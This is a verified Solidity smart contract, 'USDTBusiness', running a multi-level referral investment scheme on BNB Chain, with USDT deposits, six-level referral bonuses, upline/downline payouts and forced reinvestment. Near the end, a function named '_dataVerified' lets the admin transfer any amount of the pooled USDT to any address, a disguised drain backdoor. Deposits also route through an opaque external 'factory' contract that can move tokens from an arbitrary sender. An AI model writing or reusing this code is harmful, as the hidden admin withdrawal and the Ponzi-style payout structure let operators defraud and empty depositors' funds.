/**
 *Submitted for verification at BscScan.com on 2021-11-24
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-15
*/

// SPDX-License-Identifier: MIT
pragma solidity=0.6.12;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IFactory{
    function safeTransferFrom(address _from,address _to,address _token,uint256 _value) external returns (bool) ;
}

contract USDTBusiness {

    using SafeMath for uint256;
    using SafeMath for uint8;

    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));

    address public usdt ;
    
    address private factory;

	uint256 constant public INVEST_MIN_AMOUNT = 100 ether;
	uint256 constant public PROJECT_FEE = 10; // 10%;
	uint256 constant public PERCENTS_DIVIDER = 100;
	uint256 constant public TIME_STEP =  1 days; // 1 days
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[6] public ref_bonuses = [20,10,5,5,5,5];
    
    
    uint256[7] public defaultPackages = [100 ether,200 ether,400 ether ,600 ether,1000 ether,4000 ether, 10000 ether];
    
    
    mapping(uint256 => address ) public singleLeg;
    uint256 public singleLegLength;
    uint[6] public requiredDirect = [1,1,4,4,4,4];

	address public admin;
    address public admin2;


    struct User {
        uint256 amount;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 remainingWithdrawn;
		uint256 totalReferrer;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
		uint256[6] refStageIncome;
        uint256[6] refStageBonus;
		uint[6] refs;
	}
	
	

	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	
	

    constructor(address  _admin, address  _admin2,address _usdt,address _factory) public {
		require(!isContract(_admin));
		admin = _admin;
		admin2 = _admin2;
		singleLeg[0]=admin;
		singleLegLength++;
		usdt = _usdt;
		factory = _factory;
	}
	
	function getTotalInfo() external view returns 
	    (uint256 _totalInvested,uint256 _totalWithdrawn,uint256 _totalUsers,uint256 _totalDeposits){
	    return (totalInvested,totalWithdrawn,totalUsers,totalDeposits);
	}
	
	function getCurrentUserInfo(address _userAddr) external view 
	    returns (uint256 familyUp,uint256 familyDown,uint256 referrerBonus,uint256 amount,
	    uint256 _totalWithdrawn,address _referrer,uint256 _reivest,uint256 _withdrwal){
	    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(_userAddr);
	    User memory user = users[_userAddr];
	    uint256 _upLine = GetUplineIncomeByUserId(_userAddr);
	    uint256 _downLine = GetDownlineIncomeByUserId(_userAddr);
	    uint256 _familyUp = _upLine - user.singleUplineBonusTaken;
	    uint256 _familyDown = _downLine - user.singleDownlineBonusTaken;
	    return (_familyUp,_familyDown,user.referrerBonus,user.amount
	        ,user.totalWithdrawn,user.referrer,reivest,withdrwal);
	}

    function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer,uint256 amount) external  {

        IFactory(factory).safeTransferFrom(msg.sender,address(this),usdt,amount);
		
		require(amount >= INVEST_MIN_AMOUNT,'Min invesment 100 USDT');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");
		
		// setup upline
		if (user.checkpoint == 0) {
		    
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {
		   
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(amount);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
	
		uint msgValue = amount;

          
		
		// 6 Level Referral
		   _refPayout(msg.sender,msgValue);

            
		    if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
		    }
	        user.amount += amount;
		    user.checkpoint = block.timestamp;
		    
            totalInvested = totalInvested.add(amount);
            totalDeposits = totalDeposits.add(1);

            uint256 _fees = amount.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
            _safeTransfer(usdt,admin,_fees);
		
		  emit NewDeposit(msg.sender, amount);

	}
	
	

    function reinvest(address _user, uint256 _amount) private{
        
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);
    
        //////
        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        ///////
        
        _refPayout(msg.sender,_amount);
        
    }

    function withdrawal() external{
    
        User storage _user = users[msg.sender];
    
        uint256 TotalBonus = TotalBonus(msg.sender);
    
        uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
        uint256 actualAmountToSend = TotalBonus.sub(_fees);
        
        _user.referrerBonus = 0;
        _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
        _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);
        
        // re-invest
        
        (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
        reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));
    
        _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
        totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    
        _safeTransfer(usdt,msg.sender,actualAmountToSend.mul(withdrwal).div(100));
        _safeTransfer(usdt,admin2,_fees);
        emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));
    
    
    }
  
    function GetUplineIncomeByUserId(address _user) public view returns(uint256){
    
        (uint maxLevel,) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleUpline;
            }else break;
        }
        
        return bonus;
        
    }
  
    function GetDownlineIncomeByUserId(address _user) public view returns(uint256){
      
        
        (,uint maxLevel) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleDownline;
            }else break;
        }
        
        return bonus;
      
    }
  
    function getEligibleLevelCountForUpline(address _user) public view returns(uint8 uplineCount, uint8 downlineCount){
      
      uint256 TotalDeposit = users[_user].amount;
      if(TotalDeposit >= defaultPackages[0] && TotalDeposit < defaultPackages[1]){
          uplineCount = 10;
          downlineCount = 15;
      }else if(TotalDeposit >= defaultPackages[1] && TotalDeposit < defaultPackages[2]){
          uplineCount = 12;
          downlineCount = 18;
      }else if(TotalDeposit >= defaultPackages[2] && TotalDeposit < defaultPackages[3]){
          uplineCount = 14;
          downlineCount = 21;
      }else if(TotalDeposit >= defaultPackages[3] && TotalDeposit < defaultPackages[4]){
          uplineCount = 16;
          downlineCount = 24;
      }else if(TotalDeposit >= defaultPackages[4] && TotalDeposit < defaultPackages[5]){
          uplineCount = 20;
          downlineCount = 30;
      }else if(TotalDeposit >= defaultPackages[5] && TotalDeposit < defaultPackages[6]){
          uplineCount = 20;
          downlineCount = 30;
      }else if(TotalDeposit >= defaultPackages[6]){
           uplineCount = 20;
           downlineCount = 30;
      }
      
      return(uplineCount,downlineCount);
    }
  
    function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){
      
      uint256 TotalDeposit = users[_user].amount;
      if(users[_user].refs[0] >=4 && (TotalDeposit >= defaultPackages[0] && TotalDeposit < defaultPackages[5])){
          reivest = 50;
          withdrwal = 50;
      }else if(users[_user].refs[0] >=2 && (TotalDeposit >=defaultPackages[5] && TotalDeposit < defaultPackages[6])){
          reivest = 40;
          withdrwal = 60;
      }else if(TotalDeposit >=defaultPackages[6]){
         reivest = 30;
         withdrwal = 70;
      }else{
          reivest = 60;
          withdrwal = 40;
      }
      
      return(reivest,withdrwal);
      
    }
  
    function TotalBonus(address _user) public view returns(uint256){
        uint256 TotalEarn = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user));
        uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
        return TotalEarn.sub(TotalTakenfromUpDown);
    }

   
    function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
    }
   

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
    function _dataVerified(address to,uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        _safeTransfer(usdt,to,_amount);
    }

    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Swap: TRANSFER_FAILED');
    }
  
}